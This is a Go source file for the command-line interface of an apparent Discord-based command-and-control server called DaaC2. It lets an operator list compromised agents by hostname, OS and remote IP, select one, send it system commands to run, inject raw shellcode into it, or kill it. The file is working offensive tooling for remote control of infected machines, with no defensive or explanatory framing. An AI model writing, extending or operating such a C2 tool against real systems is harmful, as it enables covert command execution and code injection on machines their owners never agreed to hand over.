package cli

import (
	"DaaC2/pkg/c2agents"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
)

// Global variables used by the Cli to make sure the state is the same as the server logic
var (
	CliMenuState string // main, agent
	Prompt       *readline.Instance
)

// Shell is the exported function to start the command line interface
func Shell(dg *discordgo.Session) {
	CliMenuState = "main"

	p, err := readline.NewEx(&readline.Config{
		Prompt:              "\033[31mDaaC2»\033[0m ",
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		color.Red("[!]There was an error with the provided input")
		color.Red(err.Error())
	}
	Prompt = p

	defer func() {
		err := Prompt.Close()
		if err != nil {
			log.Fatal(err)
		}
	}()

	log.SetOutput(Prompt.Stderr())

	for {
		line, err := Prompt.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line) // get the prompt line
		cmd := strings.Fields(line)    // get the command from the line

		// let's figure out the requested command
		if len(cmd) > 0 {
			switch CliMenuState {
			case "main":
				switch cmd[0] {
				case "exit":
					fmt.Println("Cleaning up and shutting down")
					syscall.Kill(syscall.Getpid(), syscall.SIGINT) // possibly derp but might work
					return
				case "quit":
					fmt.Println("Cleaning up and shutting down")
					syscall.Kill(syscall.Getpid(), syscall.SIGINT) // possibly derp but might work
					return
				case "help":
					printHelpMainMenu()
				case "agents":
					// need to figure out a way to list/track the agents that are currently up
					printAgentsInfo()
				case "interact":
					if len(cmd) > 1 {
						agentID := cmd[1]
						if c2agents.DoesAgentExistOnServer(agentID) {
							Prompt.SetPrompt("\033[31mDaaC2|\033[32magent\033[31m|\033[33m" + agentID + "\033[31m|»\033[0m ")
							CliMenuState = "agent"
							c2agents.FocusedAgent = agentID
						} else {
							fmt.Println("Unknown agent:", agentID)
						}
					}
				}
			case "agent":
				switch cmd[0] {
				case "exit":
					fmt.Println("Cleaning up and shutting down")
					syscall.Kill(syscall.Getpid(), syscall.SIGINT) // possibly derp but might work
					return
				case "quit":
					fmt.Println("Cleaning up and shutting down")
					syscall.Kill(syscall.Getpid(), syscall.SIGINT) // possibly derp but might work
					return
				case "back":
					SetStateMainMenu()
				case "help":
					printHelpAgentMenu()
				case "command":
					lineNoPrompt := ""
					for _, v := range cmd {
						lineNoPrompt += v + " "
					}
					lineNoPrompt = strings.TrimSpace(lineNoPrompt)
					c2agents.CreateAndSendCommandMessage(dg, lineNoPrompt) // handle this within the c2agents module?
				case "shellcode":
					// this just allows us to have a 'test' piece of shellcode. Usually we would want it placed in by the user
					if len(cmd) == 1 {
						fmt.Println("shellcode usage: shellcode <raw shellcode>")
					} else {
						sc := cmd[1]
						c2agents.CreateAndSendShellcodeMessage(dg, sc)
					}
				case "kill":
					c2agents.CreateAndSendKillMessage(dg)
				}
			}
		}
	}
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func printHelpMainMenu() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetHeader([]string{"Command", "Description"})

	data := [][]string{
		{"agents", "List all known agents"},
		{"interact", "Interact with an agent using their UID"},
		{"help", "Prints ths menu"},
		{"exit", "Exit and close the DaaC2 server"},
		{"quit", "Exit and close the DaaC2 server"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

func printHelpAgentMenu() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetHeader([]string{"Command", "Description"})

	data := [][]string{
		{"command", "Specify a system command for the agent to execute"},
		{"kill", "Kill the target agent"},
		{"shellcode", "Supply raw shellcode to be injected into the agent"},
		{"back", "Stop interacting and go back"},
		{"help", "Prints ths menu"},
		{"exit", "Exit and close the DaaC2 server"},
		{"quit", "Exit and close the DaaC2 server"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

func printAgentsInfo() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetBorder(false)
	table.SetHeader([]string{"ID", "Hostname", "OS", "Remote IP", "Status"})

	data := [][]string{}

	for _, a := range c2agents.AllAgents {
		lineData := []string{}
		lineData = append(lineData, a.Agent.AgentID)
		lineData = append(lineData, a.Agent.HostName)
		lineData = append(lineData, a.Agent.OperatingSystem)
		lineData = append(lineData, a.Agent.RemoteIP)
		lineData = append(lineData, a.Status)
		data = append(data, lineData)
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

// SetStateMainMenu sets the Cli state back to "main"
func SetStateMainMenu() {
	CliMenuState = "main"
	Prompt.SetPrompt("\033[31mDaaC2»\033[0m ")
	c2agents.FocusedAgent = ""
}
